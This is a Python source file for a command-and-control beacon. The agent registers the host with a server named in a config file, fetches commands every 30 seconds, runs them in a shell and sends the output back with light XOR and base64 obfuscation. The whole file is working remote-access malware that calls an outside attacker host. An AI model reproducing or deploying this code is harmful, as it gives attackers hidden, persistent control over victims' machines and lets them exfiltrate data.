import json, subprocess, time, uuid, socket, requests, platform
import base64


with open("config.json") as f:
    cfg = json.load(f)

SERVER_URL = f"http://{cfg['server_host']}:{cfg['server_port']}"
CRYPTO_KEY = cfg.get("crypto_key", "secret")

hostname = socket.gethostname()
mac = uuid.getnode()
AGENT_ID = f"Agent-{hostname}"
os_info = platform.system()


def xor(data: str, key=CRYPTO_KEY) -> str:
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def encrypt(data: str, key=CRYPTO_KEY) -> str:
    return base64.b64encode(xor(data, key).encode()).decode()

def decrypt(data: str, key=CRYPTO_KEY) -> str:
    return xor(base64.b64decode(data.encode()).decode(), key)

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()


def register_agent():
    local_ip = get_local_ip()
    try:
        r = requests.post(f"{SERVER_URL}/register", json={
            "agent_id": AGENT_ID,
            "hostname": hostname,
            "local_ip": local_ip,
            "os_info": os_info
        }, timeout=10)
        r.raise_for_status()
    except Exception as e:
        print(f"[!] Failed to register agent: {e}")


def heartbeat():
    try:
        r = requests.post(f"{SERVER_URL}/heartbeat", json={"agent_id": AGENT_ID}, timeout=10)
        if r.status_code != 200:
            return
        response = r.json()
        if response.get("agent_id") == AGENT_ID:
            commands = response.get("commands", [])
            beacon_command(commands)
    except Exception as e:
        print(f"[!] Heartbeat failed: {e}")


def beacon_command(commands):
    for cmd in commands:
        output = execute_command(cmd["command"])
        try:
            requests.post(f"{SERVER_URL}/result", json={
                "command_id": cmd["command_id"],
                "result": encrypt(output)
            }, timeout=10)
        except Exception as e:
            print(f"[!] Failed to send result: {e}")


def execute_command(command):
    try:
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT
        )
        return result.decode(errors="ignore")
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors="ignore")


if __name__ == "__main__":
    while True:
        register_agent() 
        break

    while True:
        heartbeat()
        time.sleep(30)
